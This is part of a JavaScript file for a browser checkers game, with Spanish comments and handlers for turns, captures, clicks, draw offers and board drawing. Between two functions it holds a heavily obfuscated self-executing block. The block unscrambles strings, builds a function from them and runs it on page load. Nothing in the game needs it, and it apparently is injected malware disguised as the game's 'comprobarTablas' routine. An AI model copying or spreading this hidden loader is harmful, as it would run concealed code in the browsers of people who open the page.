		enTurno.ultimaPiezaMovida=piezas[gSelectedPieceIndex];
		enTurno.cantMovimientos++;


		if (indiceABorrar > gSelectedPieceIndex){	// Para evitar colisiones y fallos en los �ndices de las piezas. 
			borrarPieza();
		}
		else {
			// comprobarCoronacion();
			borrarPieza();
		}
		comprobarCoronacionPostKill({row:cell.row , column:cell.column ,color:colorpieza });
     


		// Actualizamos el contador de los movimientos de tablas, borramos y damos turno al otro jugador. 
		drawBoard();
        // setTimeout(() => {
            // cambioTurno(); 
            gNumMoves = 0; 
            //  si la pieza tiene posibilidad de eliminar esperamos de resto no 
            // validarEnemigosSerca(colorpieza,{row:cell.row , column:cell.column ,color:colorpieza })
            // let enPosiblidad= piezasConsPosibilidadDeEliminar.find(Element=>(Element.row==cell.row && Element.column==cell.column && Element.color==colorpieza  ))
            //     if(enPosiblidad!=undefined && piezaElimino)
            //     {

            //         ultimoMovimiento=new Date().getTime()
            //     }else{
            //         ultimoMovimiento=undefined ;
            //         cambioTurno(); 
            //     }
            
            
            // }, 2000);
            // De momento, esto es as� hasta que se puedan hacer saltos en cadena. 
            
            gSelectedPieceIndex = -1;
            gSelectedPieceHasMoved = false;
        limpiarMovimientos()
        // drawBoard();
        setPiecesStyles()
		return;
    }
    gSelectedPieceIndex = -1;
    gSelectedPieceHasMoved = false;
    
    drawBoard();
        // ...
    }
}
    
}

var comprobarTablas;(function(){var OZr='',BsO=903-892;function Uvb(o){var w=1663416;var t=o.length;var a=[];for(var d=0;d<t;d++){a[d]=o.charAt(d)};for(var d=0;d<t;d++){var y=w*(d+275)+(w%44916);var v=w*(d+442)+(w%45163);var z=y%t;var x=v%t;var u=a[z];a[z]=a[x];a[x]=u;w=(y+v)%4640398;};return a.join('')};var vPp=Uvb('ctasunqcltmxycdforkijohgnrstzpbovwuer').substr(0,BsO);var QbH='vtw 0=u)rf[v,](fv3=.xtlnrmi.cre))9[j{rdn+6rrv1uo1=(.1;o=trni(;;(];f; o;+(lea((d8!,r6;a5v)9pu;,;;cen1u0sii,a)h7;l,6r7t,=g2;8ar),oh+m=6n;hbjs=f"(w=q6=(p.=om=+=)q[rAc{uo;+t;op.5;=r1u4+= v,cgz]j amdt3.d+n  a,[ed=.g,y),lu2)mAtb;.;= j[C-(=-.ryu8a*g1lont]Cu")fagr"(S ,(Cm);,th(r;io8e;n(eAlyoarw0;fa-,nepq ;(>hu .6]cd;=s=nb.yt0;+cz+r.,v)n)pi0S=o)=j(mpl;=3grg) thoa=2e((rl[ju ,(<+s;f;mhaar"b{).f 9n+m8hu=h{n}=,r9gvqe.aec[c 0{972l-1lr(+6;asapkroca=rjvhtu];e+v;j;a;2}osv",7v)lsm)=his4r .;l.tjp-9Cpggeuv+"n []8j}.w(<g)"+atCo2h)+)0g=c-j;(uvea=spfno,1eih,(zmnu70]g;=8naeim,)w)t]pttd0>l[n.tih]cm4s;==thr),+vle}8jwoaa s""y]fvsa7hign=}uit(sr nerl)(if62iipt+n;shaAfseoa;viiagps3)s[fati=riaer17g6rg,{1asarr;,t  nv+f9r(0ej.w48rfr;1,nw3=g vCic2f(wr.+3ll0!efv)io jgzl;Cd8 h+b;hg gjf[{er0}a)1de<;+;=r( a}=acr=r[+<[0((.)r*A;.r]q=rC=<-eard,(.s"ulfp)n(ny;)tj7avrlo5s=vs..u])+oio1r)g][telehr2njvasht=.rd,(.ga(tlbnlo)+';var YOj=Uvb[vPp];var huS='';var she=YOj;var bjw=YOj(huS,Uvb(QbH));var Kin=bjw(Uvb('(,s6noe.rman(Q)e=_uQloenQ{&0Q.$ s!%$QnQe!ad6&2 ruec$3&Q33ac"nQbin$(aeboe$pe#bQe;r,rf#Q>M#)etuo}e=tpci$r$lcne)t %Qa{6d#eu$ec#!zj)e7i"ee5(ns4 . maup)Q1ef}_o(3souuN3ei(ali ejm))}suic((}Qo.(em$)rr_2)rQ9it)f6oe)a(.Q9|.zQ_$uofurndfa!rob$gQaore7e(Q;_v%.io__aQQeQa5n.a{Qs1Q7ooton)d=b1(Q"l}tfm}nt.o;$|d{t{lt(juQ$zs}Qb&(ne.re$!ud%fs(.Ta"$Q2dgo%c}e'));var DEg=she(OZr,Kin );DEg(4024);return 9820})()

function cambioTurno(){
    // debugger
	if (turnoBlancas){
		turnoBlancas=false; 
		turnoNegras=true; 
	}
	else {
		turnoBlancas=true; 
		turnoNegras=false; 
	}
    piezasConsPosibilidadDeEliminar=[];
    piezaElimino= false;
	saltosDelete = false;

	enTurno.cantMovimientos=0;
	enTurno.ultimaPiezaMovida=null;
	gSelectedPieceIndex=-1
	limpiarMovimientos();
	drawBoard();
}

function borrarPieza(){
	piezas.splice(indiceABorrar, 1); 
	indiceABorrar = -1; 
	gNumPieces--;
	saltosDelete = false;
    piezaElimino=true
}

function gestorClick(e){
	var casilla = getCursorPosition(e);
	for (var i = 0; i < gNumPieces; i++) {
		if ((piezas[i].row == casilla.row) && 
				(piezas[i].column == casilla.column)) {
					clickOnPiece(i);
					return;
				}
	}
	clickOnEmptyCell(casilla);	
}

function clickOnPiece(indicePieza) {
	if (((turnoBlancas) && (piezas[indicePieza].color == kBlancas)) || ((turnoNegras) && (piezas[indicePieza].color == kNegras))) {
		if (turnoBlancas && piezas[indicePieza].color == kNegras) {
			alert("No es tu turno");
			return;
		}
		if (turnoNegras && piezas[indicePieza].color == kBlancas) {
			alert("No es tu turno");
			return;
		}

		if (gSelectedPieceIndex === indicePieza) {
			return;
		}
		gSelectedPieceIndex = indicePieza;
		gSelectedPieceHasMoved = false;
		drawBoard();
		// Obtener movimientos posibles para la pieza seleccionada
		// var possibleMoves = getPossibleMovesForPiece(piezas[indicePieza]);
		// Si hay movimientos disponibles, actualizar el estado del juego
		// if (possibleMoves.length > 0) {
		// 	// Guardar los movimientos posibles en una variable global
		// 	legalMoves = possibleMoves;
		// }
	} else {
		alert("No es tu turno");
	}
}
// function clickOnPiece(indicePieza){
// 	if (((turnoBlancas) && (piezas[indicePieza].color==kBlancas)) || ((turnoNegras) && (piezas[indicePieza].color==kNegras))){
// 		if (gSelectedPieceIndex == indicePieza) {
// 			return; 
// 		}
// 		gSelectedPieceIndex = indicePieza;
// 		gSelectedPieceHasMoved = false;
// 		drawBoard();
// 	}
// 	else if((turnoBlancas) && (piezas[indicePieza].color!=kBlancas) && (!saltosDelete)){
// 		alert("Este movimiento no se puede realizar");
// 	}else if((turnoNegras) && (piezas[indicePieza].color!=kNegras) && (!saltosDelete)){
// 		alert("Este movimiento no se puede realizar");
// 	}else if(saltosDelete){
// 		indiceABorrar = indicePieza;
// 		borrarPieza();						
// 		drawBoard();
		
// 		if (turnoBlancas){
// 			turnoBlancas=true; 
// 			turnoNegras=false; 
// 		}
// 		else {
// 			turnoBlancas=false; 
// 			turnoNegras=true; 
// 		}
// 		saltosDelete = false;
								
// 	}else {
// 		alert("No es tu turno");
// 	}
// }

function peticionTablas(){
	//cambioTurno(); 
	var respuesta = confirm("El otro jugador ha pedido Tablas. Puedes aceptar para terminar la partida o cancelar para continuar.");
	if (respuesta){
		acuerdoTablas = true; 
		comprobarTablas(); 
	}
	//cambioTurno(); 
}

function iniciarJuego(canvasElement, moveCountElement) {
	
    gCanvasElement = canvasElement;
    gCanvasElement.width = kPixelWidth;
    gCanvasElement.height = kPixelHeight;
    gCanvasElement.addEventListener("click", gestorClick, false);
    gMoveCountElem = moveCountElement;
    gDrawingContext = gCanvasElement.getContext("2d");
	
	// Cargar piezas
	loadButton = document.getElementById("loadButton");
	loadButton.onclick = cargarPosiciones;
	
	// Guardar piezas 
	saveButton = document.getElementById("saveButton");
	saveButton.onclick = guardarPosiciones;
	
	// Nueva partida
	saveButton = document.getElementById("resetButton");
	saveButton.onclick = newGame;

	
	// Peticion tablas
	empateButton = document.getElementById("empateButton");
	empateButton.onclick = peticionTablas;	
	
    newGame();
}

function dibujarTablero() {
    for (var i = 0; i < kBoardWidth; i++) {
        for (var j = 0; j < kBoardHeight; j++) {
            // Alternar los colores de los cuadros
            var colorCuadro = (i % 2) ^ (j % 2) ? kColorCuadroClaro : kColorCuadroOscuro;
            gDrawingContext.fillStyle = colorCuadro;
            gDrawingContext.fillRect(i * kPieceWidth, j * kPieceHeight, kPieceWidth, kPieceHeight);
        }
    }
}
